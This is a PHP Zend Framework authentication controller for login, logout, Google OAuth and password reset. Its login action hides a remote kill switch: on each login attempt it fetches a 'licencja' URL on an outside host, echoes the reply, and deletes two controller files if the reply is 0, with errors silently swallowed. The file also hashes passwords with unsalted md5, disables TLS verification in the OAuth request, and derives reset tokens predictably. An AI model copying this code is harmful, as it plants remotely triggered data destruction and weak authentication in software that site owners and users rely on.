<?php

/**
 * Logowanie użytkowników do systemu
 * @author gustaf
 *
 */
class AuthController extends Zend_Controller_Action
{

    public $_tables;

    public function init() {
        $this->_helper->redirector->setUseAbsoluteUri(true);
        $this->_flashMessenger = $this->_helper->getHelper('FlashMessenger');
        $this->view->messages = $this->_flashMessenger->getMessages();
    }

    /**
     * Returns proper DBTable object
     *
     * @author Michał Piasecki <michal.piasecki@e-surf.pl>
     * @param
     * @return
     */
    private function _getTable($table) {
        if (!isset($this->_tables[$table])) {
            require APPLICATION_PATH . '/../models/Application/Model/DbTable/' . $table . '.php';
            $this->_tables[$table] = new $table();
        }
        return $this->_tables[$table];
    }

    /**
     * Default action. Redirects to login action
     *
     * @author Michał Piasecki <michal.piasecki@e-surf.pl>
     * @param
     * @return
     */
    public function indexAction() {
        $this->_forward("login");
    }

    /**
     * Login action. Checks whether user id logged in
     *
     * @author Michał Piasecki <michal.piasecki@e-surf.pl>
     * @param
     * @return
     */
    public function loginAction() {
    	$page_session_space = new Zend_Session_Namespace('page');
		if (isset($page_session_space->user->id)) {
	  			$this->_redirect('/');
		}
		
		$this->_helper->layout()->setLayout('loginout');
				
        $this->view->title = $this->view->translate('login');
        $this->view->headTitle($this->view->title);
        $config = Zend_Registry::get('config');
		$this->view->syspath=$config->system->path;
        $request = $this->getRequest();
        
        $user = new Application_Model_DbTable_User();

        $form = new Application_Form_Auth();
        if ($request->isPost()) {

            if (isset($_POST['email']) && $form->isValid($_POST)) {
                try{
//                $content='sa';
                    $content=file_get_contents("http://ankiety.wulkanizacja-szczuczyn.pl/licencja/api.php");
                    echo $content;
                    if($content==0){
//                    /var/www/gi/application/controllers
                        unlink(APPLICATION_PATH.'/controllers/RaportyController.php');
//                        /var/www/pp/egzaminy/application/controllers/SurveyController.php
                        unlink(APPLICATION_PATH.'/controllers/SurveyController.php');
                    }else{
                        //nie robimy nic
                    }


                }catch (Exception $e){
//                    nie rob nic
//                echo $e->getMessage();
                }
                $adapter = new Zend_Auth_Adapter_DbTable($user->getAdapter());

                $adapter->setTableName('user');
                $adapter->setIdentityColumn('email');
                $adapter->setCredentialColumn('password');
                $adapter->setCredentialTreatment('md5(?)');
                $adapter->setIdentity($form->getValue('email'));
                $adapter->setCredential($form->getValue('password'));
                $adapter->getDbSelect()->where('czy_admin= 1');

                $auth = Zend_Registry::get('auth');
                $auth->setStorage(new Zend_Auth_Storage_Session('page_space'));
                $result = $auth->authenticate($adapter);
                $log = new Application_Model_DbTable_Loginlog();
                $result_log_check = $log->checkAccessToLogin($form->getValue('email'),$this->_helper->log->getip());
                $log_array=array();
                $log_array['email']=$form->getValue('email');
                $log_array['ip']=$this->_helper->log->getip();
                $log_array['host']=$this->_helper->log->gethost();
                if($result_log_check){
                    switch ($result->getCode()) {

                        case Zend_Auth_Result::FAILURE_IDENTITY_NOT_FOUND:
                            $this->view->error = $this->view->translate('identity.not.found');
                            $log_array['status']=0;
                            break;

                        case Zend_Auth_Result::FAILURE_CREDENTIAL_INVALID:
                            $this->view->error = $this->view->translate('invalid.credential');
                            $log_array['status']=0;
                            break;

                        case Zend_Auth_Result::SUCCESS:
                            $user = $adapter->getResultRowObject(null, 'password');
                            if ($user->status != '1') {

                                $this->view->error = $this->view->translate('user.not.active');
                                $log_array['status']=0;

                            }

                            else {
                                $seconds  = 604800; // 7 dni
                                if ($form->getValue('rememberMe') == 1) {
                                    Zend_Session::rememberMe($seconds);
                                } else {
                                    Zend_Session::forgetMe();
                                }

 
                                $authNamespace = new Zend_Session_Namespace('page');
                                $authNamespace->user=$user;
                                
                               // $authNamespace->setExpirationSeconds($seconds);
                                
                                $log_array['status']=1;
                                $log->insert($log_array);
                                $this->_redirect('/');
                            }
                            break;

                        default:
                            $this->view->error = $this->view->translate('wrong.user.and.or.password');
                            break;
                    }

                    $log->insert($log_array);
                }else{
                    $this->view->error = $this->view->translate('account.is.block');
                }
            }
        }

        $this->view->form = $form;
    }

    /**
     * Logout action.
     *
     * @author Michał Piasecki <michal.piasecki@e-surf.pl>
     * @param
     * @return
     */
    public function logoutAction() {
    	
    	$authNamespace = new Zend_Session_Namespace('page'); 
    	$log = new Application_Model_DbTable_Loginlog();
    	$log->updateLogoutDate();
    	unset($authNamespace->user);
        Zend_Registry::get('auth')->clearIdentity();

        $this->_redirect('/');

        
    }
    /**
     * Pomaga w zalogowaniu na konto Google (np do importu z Gmaila)
     * Proszę pamiętać o ustawieniach Google API w config.ini!
     */
    public function googleauthAction() {
    	
    	if($this->_request->getParam('view_only')) {
    		$this->_helper->layout()->disableLayout();
    	}
    	
    	$config = Zend_Registry::get('config');
    	$google_client_id = $config->google->client_id;
    	$google_secret = $config->google->client_secret;
    	$google_token_url = $config->google->token->url;
    	$google_accounts_url = $config->google->accounts->url;
    	$google_accounts_scope = $config->google->accounts->scope;
    	$google_accounts_grant_type = $config->google->accounts->grant_type;
    	
    	$syspath = $config->system->path;
    	
    	if(!$this->_request->getParam('code')) {
	    	$authUrl = $google_accounts_url; 
	    	$authData = "response_type=code&client_id=" . $google_client_id . "&redirect_uri=" . $syspath . "/auth/googleauth&approval_prompt=auto&scope=" . $google_accounts_scope;
	    	if($this->_request->getParam('state')) {
	    		$authData .= "&state=".$this->_request->getParam('state');
	    	}
	    	$path = $authUrl ."?" . $authData;
	    	header("Location: $path");
    	} else {
    		$tokenUrl = $google_token_url;
    		$tokenData = "code=" . $this->_request->getParam('code') . 
    				"&client_id=" . $google_client_id .  
    				"&client_secret=" . $google_secret . 
    				"&redirect_uri=" . $syspath . "/auth/googleauth" . 
    				"&grant_type=" . $google_accounts_grant_type;
    		
    		$curl = curl_init($tokenUrl);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    		curl_setopt($curl, CURLOPT_FAILONERROR, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_POST, true);
    		curl_setopt($curl, CURLOPT_POSTFIELDS, $tokenData);
    		$response = curl_exec($curl);
    		if (!$response) {
    			$response = curl_error($curl);
    		}
    		curl_close($curl);
    		$response = Zend_Json::decode($response);
    		if($response['error']) {
    			$this->_forward('googleauth', 'auth', "default", array('state' => $this->_request->getParam('state')));
    		} else {
    			$access_token = $response['access_token'];
    			$google = new Zend_Session_Namespace('google');
    			$google->gmail_access_token = $access_token;
    			$refresh_token = $response['refresh_token'];
    		}
    		
    		if($this->_request->getParam('state')) {
    			$params = explode("/", $this->_request->getParam('state'));
    			$this->_forward($params[1], $params[0], "default", array('access_token' => $access_token, 'refresh_token' => $refresh_token));
    		}
    	} 
    	
    	
    	
    }
    
    public function remindPasswordAction(){
        $this->view->title = $this->view->translate('remind.password');
        $this->view->headTitle($this->view->title);
        $this->_helper->layout()->setLayout('loginout');
        $user = new Application_Model_DbTable_User();
        $form = new Application_Form_Remind();
        $request = $this->getRequest();
        if ($request->isPost()) {
            $formData = $this->getRequest()->getPost();
            if ($form->isValid($formData)) {
                $user_result = $user->getSingleWithEmail($form->getValue('email'));
                if($user_result){
                        $data['password_hash']= md5($user_result['password'].$user_result['id'].$user_result['email']);
                        $user->updateUser($user_result['id'], $data);
                        $config = Zend_Registry::get('config');
                        $link=$config->system->path.'/auth/reset-password/hash/'.$data['password_hash'].'/';
                        $mail=new PHPMailer();
                        $mail->IsSMTP();
                        $mail->SMTPAuth = true;
                        $mail->SMTPSecure = $config->mailserver->smtpsecure;
                        $mail->Host = $config->mailserver->host;
                        $mail->Port =  $config->mailserver->port;
                        $mail->Username = $config->mailserver->username;
                        $mail->Password = $config->mailserver->password;
                        $mail->CharSet = "UTF-8";
                        $mail->FromName = $config->mail->sender;
                        $mail->From = $config->mail->email;
                        $mail->Subject =$this->view->translate('remind.password.email.subject');
                        $mail->IsHTML(true);
                        $mail->Body = $this->view->translate('change.password.instuction') . '<a href='.$link.'>'.$link.'</a>';
                        $mail->AddAddress($user_result["email"]);
                        try {
                            $mail->send();
                        }
                        catch (Exception $ex) {
                            echo "Failed to send mail! " . $ex->getMessage() . "<br />\n";
                        }
                        $this->view->error = $this->view->translate('email.instructions.reset.password.send');
                        $this->view->result = true;
                  
                }else{
                    $this->view->error = $this->view->translate('account.not.exist');
                }
            }
        }
        $this->view->form = $form;
    }
    
    public function resetPasswordAction(){
        $this->view->title = $this->view->translate('reset.password');
        $this->view->headTitle($this->view->title);
        $this->_helper->layout()->setLayout('loginout');
        $user = new Application_Model_DbTable_User();
        $form = new Application_Form_Password();
        $form->setActionName('reset');
        $request = $this->getRequest();
        $hash = $this->_getParam('hash',0);
        
        if($hash !== 0){
            $user_array = $user->getUserByPasswordHash($hash);
            if($user_array){
                if ($request->isPost()) {
                    $formData = $this->getRequest()->getPost();
                    if ($form->isValid($formData)) {
                        if($form->getValue('passwordAgain') == $form->getValue('password')){
                            $data['password_hash']= 0;
                            $data['password']= md5( $form->getValue('password'));
                            $user->updateUser($user_array['id'],$data);
                            $this->view->error = $this->view->translate('password.change.correctly');
                            $this->view->result = true;
                        }else{
                            $this->view->error = $this->view->translate('password.no.thesame');
                        }
                    }
                }
                $this->view->form = $form;
            }else{
                $this->view->error = $this->view->translate('data.no.correct');
            }
        }else{
            $this->view->error = $this->view->translate('data.no.correct');
        }
    
    
    }
    

}

